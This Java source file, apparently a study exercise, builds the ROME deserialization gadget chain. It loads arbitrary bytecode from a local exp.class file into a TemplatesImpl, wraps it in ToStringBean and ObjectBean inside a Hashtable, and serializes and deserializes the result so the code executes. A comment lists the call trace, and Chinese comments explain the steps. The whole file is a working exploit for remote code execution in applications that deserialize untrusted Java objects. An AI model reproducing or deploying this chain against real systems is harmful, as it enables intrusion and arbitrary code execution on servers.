package Rome;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.syndication.feed.impl.ObjectBean;
import com.sun.syndication.feed.impl.ToStringBean;

import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Hashtable;
/*
 * invoke:497, Method (java.lang.reflect)
 * toString:137, ToStringBean (com.sun.syndication.feed.impl)
 * toString:116, ToStringBean (com.sun.syndication.feed.impl)
 * beanHashCode:193, EqualsBean (com.sun.syndication.feed.impl)
 * hashCode:110, ObjectBean (com.sun.syndication.feed.impl)
 * reconstitutionPut:1218, Hashtable (java.util)
 * readObject:1195, Hashtable (java.util)
 */
public class HashTable {
    public static void main(String[] args) throws Exception {
        byte[] code = Files.readAllBytes(Paths.get("C:\\Users\\86136\\Desktop\\cc1\\target\\classes\\exp.class"));


        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_name", "whatever");
        setFieldValue(templates, "_bytecodes", new byte[][]{code});
        ToStringBean toStringBean = new ToStringBean(Templates.class,templates);
        ObjectBean objectBean = new ObjectBean(ToStringBean.class,toStringBean);
        Hashtable hashtable = new Hashtable();
        //这里其实会触发,由于没完全序列化所以没成功
        hashtable.put(objectBean,"123");

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(hashtable);
        oos.close();
//        System.out.println(new String(Base64.getEncoder().encode(baos.toByteArray())));

        //反序列化
        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
//        ois.close();



    }
    public static void setFieldValue(Object obj, String name, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
